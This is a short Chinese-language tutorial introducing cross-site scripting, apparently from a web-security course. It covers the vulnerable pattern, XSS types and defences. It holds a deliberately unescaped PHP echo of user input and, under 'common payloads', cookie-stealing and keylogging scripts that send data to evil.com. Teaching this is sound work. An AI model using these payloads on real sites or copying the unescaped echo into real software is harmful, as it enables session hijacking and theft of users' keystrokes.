# 什么是 XSS？

## 概述

跨站脚本攻击（Cross-Site Scripting，XSS）是一种代码注入攻击。攻击者在网页中注入恶意脚本，当其他用户访问该页面时，脚本会在受害者的浏览器中执行。

## 原理

Web 应用将用户输入直接嵌入到 HTML 页面中，而没有进行适当的转义或过滤。

### 示例

搜索功能将用户输入反射到页面：
```html
<p>搜索结果: <?php echo $_GET['keyword']; ?></p>
```

如果用户输入 `<script>alert('XSS')</script>`，页面变成：
```html
<p>搜索结果: <script>alert('XSS')</script></p>
```

## XSS 的分类

| 类型 | 描述 | 存储位置 |
|------|------|----------|
| 反射型 XSS | 恶意脚本在 URL 中 | 不存储 |
| 存储型 XSS | 恶意脚本保存到数据库 | 数据库 |
| DOM 型 XSS | 前端 JS 处理不当 | 不存储 |

## XSS 的危害

1. **Cookie 窃取** — 获取用户的会话 Cookie，劫持账户
2. **键盘记录** — 记录用户的键盘输入
3. **钓鱼攻击** — 伪造登录页面窃取凭证
4. **页面篡改** — 修改页面内容
5. **挖矿脚本** — 利用用户浏览器挖矿

## 常用 Payload

```javascript
// 弹窗验证
<script>alert('XSS')</script>

// Cookie 窃取
<script>new Image().src="http://evil.com/steal?c="+document.cookie</script>

// 键盘记录
<script>document.onkeypress=function(e){new Image().src="http://evil.com/log?k="+e.key}</script>
```

## 防御方法

1. **输出编码** — HTML 实体编码、JavaScript 编码
2. **CSP** — 内容安全策略限制脚本来源
3. **HttpOnly Cookie** — 防止 JavaScript 访问 Cookie
4. **输入验证** — 白名单验证用户输入

## 下一步

[练习反射型 XSS →](./02-reflected-xss.md)
